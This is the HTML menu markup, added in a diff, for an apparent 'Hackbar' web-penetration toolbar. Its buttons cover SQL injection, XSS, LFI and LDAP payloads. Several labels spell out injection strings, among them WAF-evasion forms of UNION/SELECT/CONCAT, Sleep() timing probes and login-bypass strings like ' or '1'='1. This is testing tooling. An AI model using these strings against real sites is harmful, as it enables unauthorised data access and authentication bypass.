@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="./assets/css/style.css">
+    <link rel="stylesheet" type="text/css" href="./assets/css/semantic.css">
+    <link rel="stylesheet" type="text/css" href="./assets/css/semantic.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css" />
+    <script src="./assets/js/jquery.min.js"></script>
+    <title>Hackbar</title>
+</head>
+<body>
+
+<section class="main-window">
+    <div>
+
+<div class="ui menu">
+
+         <!--  sql section -->
+            <a class="ui dropdown item">
+              SQL
+              <i class="dropdown icon"></i>
+              <div class="menu">
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">MYSQL</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="mysqlbasicinfo">
+                              <i class="info circle icon"></i>Basic info column</button></div>
+                            <div class="item"><button class="ui-btn" name="union">
+                              <i class="info circle icon"></i>Union All Select</button></div>
+                            <div class="item"><button class="ui-btn" name="unionnull">
+                              <i class="info circle icon"></i>Union Null Select</button></div>
+                            <div class="item"><button class="ui-btn" name="orderby">
+                              <i class="info circle icon"></i>Order By</button></div>
+                            <div class="item"><button class="ui-btn" name="groupby">
+                              <i class="info circle icon"></i>Group By</button></div>
+                            <div class="item"><button class="ui-btn" name="mysqlconvertutf8">
+                              <i class="exchange icon"></i>Convert using UTF-8</button></div>
+                            <div class="item"><button class="ui-btn" name="mysqlconvertlatin1">
+                              <i class="exchange icon"></i>Convert using Latin1</button></div>
+                          </div>
+                        </div>
+
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Database</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="datadump"><i class="database icon"></i>Database</button></div>
+                          </div>
+                        </div>
+
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">DIOS MYSQL</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="silentcoder"><i class="user outline icon"></i>DIOS by Mr.silent coder</button></div>
+                            <div class="item"><button class="ui-btn" name="madblood"><i class="user outline icon"></i>DIOS by Madblood</button></div>
+                            <div class="item"><button class="ui-btn" name="tpro"><i class="user outline icon"></i>DIOS by T-Pro</button></div>
+                            <div class="item"><button class="ui-btn" name="z3r0"><i class="user outline icon"></i>DIOS by Dr.Z3r0</button></div>
+                            <div class="item"><button class="ui-btn" name="zen"><i class="user outline icon"></i>DIOS by Zen</button></div>
+                            <div class="item"><button class="ui-btn"name="makMan"><i class="user outline icon"></i>DIOS by MakMan</button></div>
+                            <div class="item"><button class="ui-btn" name="tr0jan"><i class="user outline icon"></i>DIOS by tr0jan
+                            <div class="ui mini red circular label">W</div></button></div>
+                            <div class="item"><button class="ui-btn" name="mad"><i class="user outline icon"></i>DIOS by Madblood
+                            <div class="ui mini red circular label">W</div></button></div>
+                            <div class="item"><button class="ui-btn" name="madwaf"><i class="user outline icon"></i>DIOS by Madblood @x
+                            <div class="ui mini red circular label">W</div></button></div>
+                            <div class="item"><button class="ui-btn" name="benchmark"><i class="user outline icon"></i>DIOS by tr0jan Benchmark()</button></div>
+                            <div class="item"><button class="ui-btn" name="diosroot"><i class="user outline icon"></i>DIOS by r0ot@h3x49</button></div>
+                            <div class="item"><button class="ui-btn" name="rummy"><i class="user outline icon"></i>DIOS by Rummy</button></div>
+                            <div class="item"><button class="ui-btn" name="ajkaro"><i class="user outline icon"></i>DIOS by Ajkaro</button></div>
+                            <div class="item"><button class="ui-btn" name="zenWAF"><i class="user outline icon"></i>DIOS by Zen<div class="ui mini red circular label">W</div></button></div>
+                            <div class="item"><button class="ui-btn" name="wAF"><i class="user outline icon"></i>DIOS by WAF <div class="ui mini red circular label">W</div></button></div>
+                          </div>
+                        </div>
+                         <div class="item">
+                           <i class="dropdown icon"></i>
+                           <span class="text">CHAR</span>
+                            <div class="menu">
+                                <div class="item"><button class="ui-btn" name="mysqltosqlchar"><i class="sort down icon"></i>MYSQL CHAR()</button></div>
+                                <div class="item"><button class="ui-btn" name="mssqltosqlchar"><i class="sort down icon"></i>MSSQL CHAR()</button></div>
+                                <div class="item"><button class="ui-btn" name="oracletosqlchar"><i class="sort down icon"></i>Oracle CHAR()</button></div>
+                            </div>
+                         </div>
+                         <div class="item"><button class="ui-btn" name="unionselect"><i class="database icon"></i>Union Select Statement</button></div>
+                         <div class="item"><button class="ui-btn" name="spacestocomments"><i class="database icon"></i>Spaces to inline comments</button></div>
+                        </div>
+                      </a>
+
+
+<!-- Error Based -->
+
+
+
+                    <a class="ui dropdown item">
+                        Error Based
+                        <i class="dropdown icon"></i>
+                        <div class="menu">
+                          <div class="item">
+                            <i class="dropdown icon"></i>
+                            <span class="text">Error Based</span>
+                              <div class="menu">
+                                <div class="item"><button class="ui-btn" name="errorbVersion"><i class="question circle icon"></i>Get Version</button></div>
+                                <div class="item"><button class="ui-btn" name="errorbDatabase"><i class="database icon"></i>Get Database</button></div>
+                                <div class="item"><button class="ui-btn" name="errorbTable"><i class="table icon"></i>Get Tables</button></div>
+                                <div class="item"><button class="ui-btn" name="errorbColumns"><i class="columns icon"></i>Get Columns</button></div>
+                                <div class="item"><button class="ui-btn" name="errorbData"><i class="hdd icon"></i>Get Data</button></div>
+                            </div>
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Polygon/Multipoint</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="polygonVersion"><i class="question circle icon"></i>Get Version</button></div>
+                              <div class="item"><button class="ui-btn" name="polygonTable"><i class="table icon"></i>Get Tables</button></div>
+                            </div>
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Multipoint Dios</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="mpDios"><i class="box icon"></i>DIOS 1</button></div>
+                              <div class="item"><button class="ui-btn" name="mpDios1"><i class="box icon"></i>DIOS 2</button></div>
+                              <div class="item"><button class="ui-btn" name="mpDios2"><i class="box icon"></i>DIOS 3</button></div>
+                              <div class="item"><button class="ui-btn" name="mpDios3"><i class="box icon"></i>DIOS 4</button></div>
+                              </div>
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Advance Error based(MySQL >=55)</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="aderrorV"><i class="question circle icon"></i>Get Version</button></div>
+                              <div class="item"><button class="ui-btn" name="aderrorT"><i class="table icon"></i>Get Tables</button></div>
+                            </div>
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">DIOS By MadBlood(MySQL >=5.5)</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="mddios"><i class="box icon"></i>DIOS 1</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios2"><i class="box icon"></i>DIOS 2</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios3"><i class="box icon"></i>DIOS 3</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios4"><i class="box icon"></i>DIOS 4</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios5"><i class="box icon"></i>DIOS 5</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios6"><i class="box icon"></i>DIOS 6</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios7"><i class="box icon"></i>DIOS 7</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios8"><i class="box icon"></i>DIOS 8</button></div>
+                              <div class="item"><button class="ui-btn" name="mddios9"><i class="box icon"></i>DIOS 9</button></div>
+                              </div>
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Double Query Based</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="dqbased"><i class="question circle icon"></i>Get Version</button></div>
+                              <div class="item"><button class="ui-btn" name="dqbased2"><i class="database icon"></i>Get Database</button></div>
+                              <div class="item"><button class="ui-btn" name="dqbased3"><i class="table icon"></i>Get Tables</button></div>
+                              <div class="item"><button class="ui-btn" name="dqbased4"><i class="columns icon"></i>Get Columns</button></div>
+                              <div class="item"><button class="ui-btn" name="dqbased5"><i class="hdd icon"></i>Get Data</button></div>
+                            </div>
+                          </div>
+                      </div>
+                    </a>
+
+
+                    <a class="ui dropdown item">
+                      WAF
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                            <div class="item"><button class="ui-btn" name="waf1"><i class="shield alternate icon"></i>/*!  */</button></div>
+                            <div class="item"><button class="ui-btn" name="waf2"><i class="shield alternate icon"></i>/*!5000  */</button></div>
+                            <div class="item"><button class="ui-btn" name="waf3"><i class="shield alternate icon"></i>/*!12345 */</button></div>
+                            <div class="item"><button class="ui-btn" name="waf4"><i class="shield alternate icon"></i>/*!13337 */</button></div>
+                      </div>
+                    </a>
+                    
+                    <a class="ui dropdown item">
+                      XSS
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Xss</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="stringtocharcode"><i class="code icon"></i>String.fromCharCode()</button></div>
+                            <div class="item"><button class="ui-btn" name="stringtohtmlcharcode"><i class="code icon"></i>HTML Characters</button></div>
+                            <div class="item"><button class="ui-btn" name="xssalert"><i class="exclamation triangle icon"></i>alert('XSS') statement</button></div>
+                          </div>
+                        </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="payload1"><i class="recycle icon"></i>payload 1</button></div>
+                              <div class="item"><button class="ui-btn" name="payload2"><i class="recycle icon"></i>payload 2</button></div>
+                              <div class="item"><button class="ui-btn" name="payload3"><i class="recycle icon"></i>payload 3</button></div>
+                              <div class="item"><button class="ui-btn" name="payload4"><i class="recycle icon"></i>payload 4</button></div>
+                              <div class="item"><button class="ui-btn" name="payload5"><i class="recycle icon"></i>payload 5</button></div>
+                              <div class="item"><button class="ui-btn" name="payload6"><i class="recycle icon"></i>payload 6</button></div>
+                              <div class="item"><button class="ui-btn" name="payload7"><i class="recycle icon"></i>payload 7</button></div>
+                              <div class="item"><button class="ui-btn" name="payload8"><i class="recycle icon"></i>payload 8</button></div>
+                              <div class="item"><button class="ui-btn" name="payload9"><i class="recycle icon"></i>payload 9</button></div>
+                              <div class="item"><button class="ui-btn" name="payload10"><i class="recycle icon"></i>payload 10</button></div>
+                              </div>
+                          </div>
+                           <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload 2</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="payload11"><i class="recycle icon"></i>payload 11</button></div>
+                              <div class="item"><button class="ui-btn" name="payload12"><i class="recycle icon"></i>payload 12</button></div>
+                              <div class="item"><button class="ui-btn" name="payload13"><i class="recycle icon"></i>payload 13</button></div>
+                              <div class="item"><button class="ui-btn" name="payload14"><i class="recycle icon"></i>payload 14</button></div>
+                              <div class="item"><button class="ui-btn" name="payload15"><i class="recycle icon"></i>payload 15</button></div>
+                              <div class="item"><button class="ui-btn" name="payload16"><i class="recycle icon"></i>payload 16</button></div>
+                              <div class="item"><button class="ui-btn" name="payload17"><i class="recycle icon"></i>payload 17</button></div>
+                              <div class="item"><button class="ui-btn" name="payload18"><i class="recycle icon"></i>payload 18</button></div>
+                              <div class="item"><button class="ui-btn" name="payload19"><i class="recycle icon"></i>payload 19</button></div>
+                              <div class="item"><button class="ui-btn" name="payload20"><i class="recycle icon"></i>payload 20</button></div>
+                              </div>
+                              </div>
+
+                      </div>
+                    </a>
+
+                    <a class="ui dropdown item">
+                      LFI
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="lfi1"><i class="asterisk icon"></i>payload 1</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi2"><i class="asterisk icon"></i>payload 2</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi3"><i class="asterisk icon"></i>payload 3</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi4"><i class="asterisk icon"></i>payload 4</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi5"><i class="asterisk icon"></i>payload 5</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi6"><i class="asterisk icon"></i>payload 6</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi7"><i class="asterisk icon"></i>payload 7</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi8"><i class="asterisk icon"></i>payload 8</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi9"><i class="asterisk icon"></i>payload 9</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi10"><i class="asterisk icon"></i>payload 10</button></div>
+                              </div>
+
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload 2</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="lfi11"><i class="asterisk icon"></i>payload 11</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi12"><i class="asterisk icon"></i>payload 12</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi13"><i class="asterisk icon"></i>payload 13</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi14"><i class="asterisk icon"></i>payload 14</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi15"><i class="asterisk icon"></i>payload 15</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi16"><i class="asterisk icon"></i>payload 16</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi17"><i class="asterisk icon"></i>payload 17</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi18"><i class="asterisk icon"></i>payload 18</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi19"><i class="asterisk icon"></i>payload 19</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi20"><i class="asterisk icon"></i>payload 20</button></div>
+                              </div>
+                              </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload 3</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="lfi21"><i class="asterisk icon"></i>payload 21</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi22"><i class="asterisk icon"></i>payload 22</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi23"><i class="asterisk icon"></i>payload 23</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi24"><i class="asterisk icon"></i>payload 24</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi25"><i class="asterisk icon"></i>payload 25</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi26"><i class="asterisk icon"></i>payload 26</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi27"><i class="asterisk icon"></i>payload 27</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi28"><i class="asterisk icon"></i>payload 28</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi29"><i class="asterisk icon"></i>payload 29</button></div>
+                              <div class="item"><button class="ui-btn" name="lfi30"><i class="asterisk icon"></i>payload 30</button></div>
+                              </div>
+                         </div>
+
+                      </div>
+                    </a>
+
+                     <a class="ui dropdown item">
+                      LDAP
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="ldap1"><i class="plus square outline icon"></i>payload 1</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap2"><i class="plus square outline icon"></i>payload 2</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap3"><i class="plus square outline icon"></i>payload 3</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap4"><i class="plus square outline icon"></i>payload 4</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap5"><i class="plus square outline icon"></i>payload 5</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap6"><i class="plus square outline icon"></i>payload 6</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap7"><i class="plus square outline icon"></i>payload 7</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap8"><i class="plus square outline icon"></i>payload 8</button></div>
+                              </div>
+
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload 2</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="ldap9"><i class="plus square outline icon"></i>payload 9</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap10"><i class="plus square outline icon"></i>payload 10</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap11"><i class="plus square outline icon"></i>payload 11</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap12"><i class="plus square outline icon"></i>payload 12</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap13"><i class="plus square outline icon"></i>payload 13</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap14"><i class="plus square outline icon"></i>payload 14</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap15"><i class="plus square outline icon"></i>payload 15</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap16"><i class="plus square outline icon"></i>payload 16</button></div>
+                              </div>
+                              </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Payload 3</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="ldap17"><i class="plus square outline icon"></i>payload 17</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap18"><i class="plus square outline icon"></i>payload 18</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap19"><i class="plus square outline icon"></i>payload 19</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap20"><i class="plus square outline icon"></i>payload 20</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap21"><i class="plus square outline icon"></i>payload 21</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap22"><i class="plus square outline icon"></i>payload 22</button></div>
+                              <div class="item"><button class="ui-btn" name="ldap23"><i class="plus square outline icon"></i>payload 23</button></div>
+                              </div>
+                         </div>
+
+                      </div>
+                    </a>
+
+                    <a class="ui dropdown item">
+                      VARIABLES
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Version</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="variable1"><i class="cube icon"></i>@@VERSION</button></div>
+                              <div class="item"><button class="ui-btn" name="variable2"><i class="cube icon"></i>VERSION()</button></div>
+                              <div class="item"><button class="ui-btn" name="variable3"><i class="cubes icon"></i>@@GLOBAL.VERSION</button></div>
+                              </div>
+
+                          </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">User</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="variable4"><i class="user icon"></i>USER()</button></div>
+                              <div class="item"><button class="ui-btn" name="variable5"><i class="user circle icon"></i>CURRENT_USER()</button></div>
+                              <div class="item"><button class="ui-btn" name="variable6"><i class="user outline icon"></i>SYSTEM_USER()</button></div>
+                              <div class="item"><button class="ui-btn" name="variable7"><i class="user circle outline icon"></i>SESSION_USER()</button></div>
+                              <div class="item"><button class="ui-btn" name="variable8"><i class="snowflake icon"></i>SUBSTRING_INDEX</button></div>
+                              <div class="item"><button class="ui-btn" name="variable9"><i class="snowflake outline icon"></i>(SELECT+CONCAT)</button></div>
+                              </div>
+                              </div>
+                          <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Database</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="variable10"><i class="database icon"></i>DATABASE()</button></div>
+                              <div class="item"><button class="ui-btn" name="variable11"><i class="life ring icon"></i>SCHEMA()</button></div>
+                              <div class="item"><button class="ui-btn" name="variable12"><i class="crosshairs icon"></i>(SELECT+CONCAT(DB)</button></div>
+                              </div>
+                         </div>
+                         <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Mysql OTH</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="variable13"><i class="globe icon"></i>@@HOSTNAME</button></div>
+                              <div class="item"><button class="ui-btn" name="variable14"><i class="caret down icon"></i>@@VCM</button></div>
+                              <div class="item"><button class="ui-btn" name="variable15"><i class="caret down icon"></i>@@VCO</button></div>
+                              <div class="item"><button class="ui-btn" name="variable16"><i class="folder outline icon"></i>@@BASEDIR</button></div>
+                              <div class="item"><button class="ui-btn" name="variable17"><i class="folder icon"></i>@@DATADIR</button></div>
+                              <div class="item"><button class="ui-btn" name="variable18"><i class="caret down icon"></i>@@HAVE_OPENSSL</button></div>
+                              <div class="item"><button class="ui-btn" name="variable19"><i class="caret down icon"></i>@@WAIT_TIMEOUT</button></div>
+                              <div class="item"><button class="ui-btn" name="variable20"><i class="caret down icon"></i>@@MYISAM_RECOVER</button></div>
+                              <div class="item"><button class="ui-btn" name="variable21"><i class="caret down icon"></i>@@HAVE_INNODB</button></div>
+                              <div class="item"><button class="ui-btn" name="variable22"><i class="linkify icon"></i>@@HAVE_SYMLINK</button></div>
+                              <div class="item"><button class="ui-btn" name="variable23"><i class="caret down icon"></i>@@CHARACTER_SET</button></div>
+                              <div class="item"><button class="ui-btn" name="variable24"><i class="caret down icon"></i>@@CHARACTER_SET_C</button></div>
+                              <div class="item"><button class="ui-btn" name="variable25"><i class="caret down icon"></i>@@CHARACTER_SET_FS</button></div>
+                              <div class="item"><button class="ui-btn" name="variable26"><i class="caret down icon"></i>@@FT_BOOLEAN_SNTX</button></div>
+                              </div>
+                              </div>
+                        <div class="item">
+                              <i class="dropdown icon"></i>
+                              <span class="text">Info</span>
+                              <div class="menu">
+                              <div class="item"><button class="ui-btn" name="variable27"><i class="user icon"></i>User priv</button></div>
+                              <div class="item"><button class="ui-btn" name="variable28"><i class="folder icon"></i>File priv</button></div>
+                              <div class="item"><button class="ui-btn" name="variable29"><i class="list icon"></i>Process list</button></div>
+                              <div class="item"><button class="ui-btn" name="variable30"><i class="caret down icon"></i>@@CHARACTER_SET_S</button></div>
+                              <div class="item"><button class="ui-btn" name="variable31"><i class="caret down icon"></i>@@CHARACTER_SET_D</button></div>
+                              <div class="item"><button class="ui-btn" name="variable32"><i class="caret down icon"></i>@@CHARACTER_SETS_D</button></div>
+                              <div class="item"><button class="ui-btn" name="variable33"><i class="caret down icon"></i>@@COLLATION_CON</button></div>
+                              <div class="item"><button class="ui-btn" name="variable34"><i class="caret down icon"></i>@@CONNECT_TIMEOUT</button></div>
+                              <div class="item"><button class="ui-btn" name="variable35"><i class="file icon"></i>@@PID_FILE</button></div>
+                              <div class="item"><button class="ui-btn" name="variable36"><i class="folder open icon"></i>@@SLAVE_LOAD_TMPDIR</button></div>
+                              </div>
+                              </div>    
+
+                      </div>
+                    </a>
+
+
+
+
+
+                    <a class="ui dropdown item">
+                      Bypasser
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">SQL</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="dsub"><i class="database icon"></i>Database</button></div>
+                            <div class="item"><button class="ui-btn" name="dsub2"><i class="dot circle outline icon"></i>Sleep(10)</button></div>
+                            <div class="item"><button class="ui-btn" name="dsub3"><i class="dot circle icon"></i>Sleep Database</button></div>
+                          </div>
+                        </div>
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Error Fix</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="bpass"><i  class="plus icon"></i>%23</button></div>
+                            <div class="item"><button class="ui-btn" name="bpass1"><i class="plus icon"></i>')-- -</button></div>
+                            <div class="item"><button class="ui-btn" name="bpass2"><i class="plus icon"></i>%60</button></div>
+                            <div class="item"><button class="ui-btn" name="bpass3"><i class="plus icon"></i>')--+</button></div>
+                            <div class="item"><button class="ui-btn" name="bpass4"><i class="plus icon"></i>%00</button></div>
+                            <div class="item"><button class="ui-btn" name="bpass5"><i class="plus icon"></i>%90</button></div>
+                            <div class="item"><button class="ui-btn" name="bpass6"><i class="plus icon"></i>%2323</button></div>
+                            <div class="item"><button class="ui-btn" name="bpass7"><i class="plus icon"></i>)-- </button></div>
+                            <div class="item"><button class="ui-btn" name="bpass8"><i class="plus icon"></i>-- </button></div>
+                            <div class="item"><button class="ui-btn" name="bpass9"><i class="plus icon"></i>--+- </button></div>
+                          </div>
+                        </div>
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Order BY</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="waforderBy"><i class="dot circle outline icon"></i>/**/ORDER/**/BY/**/</button></div>
+                            <div class="item"><button class="ui-btn" name="waforderBy2"><i class="dot circle outline icon"></i>/**/**/ORDER/**/BY/**/**/</button></div>
+                            <div class="item"><button class="ui-btn" name="waforderBy3"><i class="dot circle outline icon"></i>/*!order*/+/*!by*/</button></div>
+                            <div class="item"><button class="ui-btn" name="waforderBy4"><i class="dot circle outline icon"></i>/*!5ORDER*//**//*!5BY*/</button></div>
+                          </div>
+                        </div>
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Union</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="wafunion"><i class="dot circle icon"></i>%55nion(%53elect 1,2,3)</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion2"><i class="dot circle icon"></i>+union+distinct+select+</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion3"><i class="dot circle icon"></i>+union+distinctROW+select+</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion4"><i class="dot circle icon"></i>+ #?uNiOn + #?sEleCt</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion5"><i class="dot circle icon"></i>+ #?1q %0AuNiOn</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion6"><i class="dot circle icon"></i>/*!%53eLEct*/</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion7"><i class="dot circle icon"></i>+un/**/ion+se/**/lect</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion8"><i class="dot circle icon"></i>UNION/*&test=1*</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion9"><i class="dot circle icon"></i>+?UnI?On?+</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion10"><i class="dot circle icon"></i>+(UnIoN)+</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion11"><i class="dot circle icon"></i>+(UnI)(oN)</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion12"><i class="dot circle icon"></i>+UnIoN/</button></div>
+                            <div class="item"><button class="ui-btn" name="wafunion13"><i class="dot circle icon"></i>+uni>on+sel>ect+</button></div>
+                          </div>
+                        </div>
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Concat</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="wafconcat"><i class="bullseye icon"></i>CoNcAt()</button></div>
+                            <div class="item"><button class="ui-btn" name="wafconcat2"><i class="bullseye icon"></i>CON%08CAT()</button></div>
+                            <div class="item"><button class="ui-btn" name="wafconcat3"><i class="bullseye icon"></i>%0AcOnCat()</button></div>
+                            <div class="item"><button class="ui-btn" name="wafconcat4"><i class="bullseye icon"></i>/**//*!12345cOnCat*/</button></div>
+                            <div class="item"><button class="ui-btn" name="wafconcat5"><i class="bullseye icon"></i>/*!50000cOnCat*/(/*!*/)</button></div>
+                          </div>
+                        </div>
+                         <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Numbers</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="wafnumber"><i class="life ring outline icon"></i>+div+0</button></div>
+                            <div class="item"><button class="ui-btn" name="wafnumber2"><i class="life ring outline icon"></i>Having+1=0</button></div>
+                            <div class="item"><button class="ui-btn" name="wafnumber3"><i class="life ring outline icon"></i>/*!and*/+1=0</button></div>
+                            <div class="item"><button class="ui-btn" name="wafnumber4"><i class="life ring outline icon"></i>and(1)=(0)</button></div>
+                          </div>
+                        </div>
+                         <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Shema</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="wafshema"><i class="life ring icon"></i>Shema Mode 1</button></div>
+                            <div class="item"><button class="ui-btn" name="wafshema2"><i class="life ring icon"></i>Shema Mode 2</button></div>
+                            <div class="item"><button class="ui-btn" name="wafshema3"><i class="life ring icon"></i>Shema Mode 3</button></div>
+                            <div class="item"><button class="ui-btn" name="wafshema4"><i class="life ring icon"></i>Shema Mode 4</button></div>
+                            <div class="item"><button class="ui-btn" name="wafshema5"><i class="life ring icon"></i>Shema Mode 5</button></div>
+                          </div>
+                        </div>
+                      </div>
+                    </a>
+
+                    <a class="ui dropdown item">
+                      Passcode
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Passcode 1</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="pass"><i class="user secret icon"></i>or 'x'='x</button></div>
+                            <div class="item"><button class="ui-btn" name="pass1"><i class="user secret icon"></i>'or'1='1</button></div>
+                            <div class="item"><button class="ui-btn" name="pass2"><i class="user secret icon"></i>' or '1'='1</button></div>
+                            <div class="item"><button class="ui-btn" name="pass3"><i class="user secret icon"></i>' or 'x'='x</button></div>
+                            <div class="item"><button class="ui-btn" name="pass4"><i class="user secret icon"></i>1'or'1'='1</button></div>
+                            <div class="item"><button class="ui-btn" name="pass5"><i class="user secret icon"></i>' or 0=0 --</button></div>
+                            <div class="item"><button class="ui-btn" name="pass6"><i class="user secret icon"></i>or 0=0--</button></div>
